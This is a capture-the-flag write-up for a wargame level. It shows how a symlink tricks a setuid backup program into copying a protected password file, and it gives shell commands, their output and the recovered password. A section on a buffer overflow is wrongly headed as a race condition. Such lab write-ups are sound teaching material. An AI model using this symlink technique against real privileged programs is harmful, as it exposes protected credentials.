# Level 08 - Symlink File Read Exploit

## Overview
A file backup utility that copies files to `./backups/` directory. We exploit it using symbolic links to read protected files.

---

## The Vulnerability

```c
int main(int argc, char **argv) {
    FILE *source = fopen(argv[1], "r");  // Open user-provided file
    
    // Create backup path
    char backup_path[100];
    strcpy(backup_path, "./backups/");
    strcat(backup_path, argv[1]);
    
    // Copy to backup
    int fd = open(backup_path, O_CREAT | O_WRONLY, 0x1b0);
    
    // Copy byte by byte
    int c;
    while ((c = fgetc(source)) != EOF) {
        write(fd, &c, 1);
    }
}
```

**The Bug:** Program reads any file the user specifies and writes it to `./backups/filename`.

**The Exploit:** Use symlink to read protected password file, then read the backup copy.

---

## Understanding Symlinks

A symbolic link (symlink) is a file that points to another file:

```bash
ln -s /path/to/target linkname

```

**When program opens the symlink:** It follows the link and opens the target file!

```
program opens "target"
    ↓
"target" is symlink → /home/users/level09/.pass
    ↓
program actually reads "/home/users/level09/.pass"
    ↓
writes content to "./backups/target"
    ↓
We can read "./backups/target"!
```

---

## Exploitation

### Why It Works

1. **Program runs as level09** (setuid bit)
2. **Program can read** `/home/users/level09/.pass`
3. **We can't read** `/home/users/level09/.pass` directly
4. **But we control** where the symlink points
5. **Program copies** content to `./backups/target` (which we can read!)

### The Attack

```
Create symlink: target → /home/users/level09/.pass
Run program with "target" as argument
Program reads /home/users/level09/.pass (has permission)
Program writes to ./backups/target (we can read this!)
Read ./backups/target to get password
```

---

## Solution

```bash
# 1. Create working directory with backups folder
level08@OverRide:~$ mkdir -p /tmp/exploit/backups
level08@OverRide:~$ cd /tmp/exploit

# 2. Create symlink pointing to password file
level08@OverRide:/tmp/exploit$ ln -s /home/users/level09/.pass target

# 3. Verify symlink
level08@OverRide:/tmp/exploit$ ls -la
lrwxrwxrwx 1 level08 level08   29 Feb 13 10:00 target -> /home/users/level09/.pass

# 4. Run the backup program
level08@OverRide:/tmp/exploit$ /home/users/level08/level08 target

# 5. Read the backup (contains password!)
level08@OverRide:/tmp/exploit$ cat backups/target
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

**Password:** `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`

---

## How It Works

```
STEP 1: Create symlink
├─ target → /home/users/level09/.pass
└─ "target" is just a pointer, not actual file

STEP 2: Run program
├─ Program: fopen("target", "r")
├─ OS follows symlink → opens /home/users/level09/.pass
└─ Program has level09 permissions (setuid) → can read!

STEP 3: Program copies content
├─ Reads from /home/users/level09/.pass
├─ Writes to ./backups/target
└─ ./backups/target is a real file (not symlink!)

STEP 4: Read backup
├─ cat ./backups/target
└─ Password revealed!
```

---

## Key Concepts

### Setuid Bit
Programs with setuid run with owner's permissions, not user's:
```bash
ls -l /home/users/level08/level08
-rwsr-s---+ 1 level09 users ... level08
  ↑
Setuid bit: runs as level09, not level08
```

### Symlink vs Hard Link
- **Symlink:** Pointer to path (can cross filesystems)
- **Hard link:** Direct reference to inode (same filesystem only)

### Why Program Trusts Symlink
Program uses `fopen()` which follows symlinks automatically. No validation that "target" isn't a symlink.

---

## Alternative: TOCTOU Race Condition

There's also a buffer overflow in `log_wrapper()`:
```c
char buffer[264];
strcpy(buffer, msg);  // No length check!
```

But symlink method is much simpler and more reliable!

---

## Summary

**Vulnerability:** Program follows symlinks when opening files, allowing arbitrary file reads.

**Exploitation:**
1. Create symlink to protected file (`/home/users/level09/.pass`)
2. Run setuid program with symlink as argument
3. Program reads protected file (has permission due to setuid)
4. Program writes content to accessible backup location
5. Read backup to get password

**Key Insight:** Setuid programs that handle user-controlled file paths are vulnerable to symlink attacks.

**Password:** `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`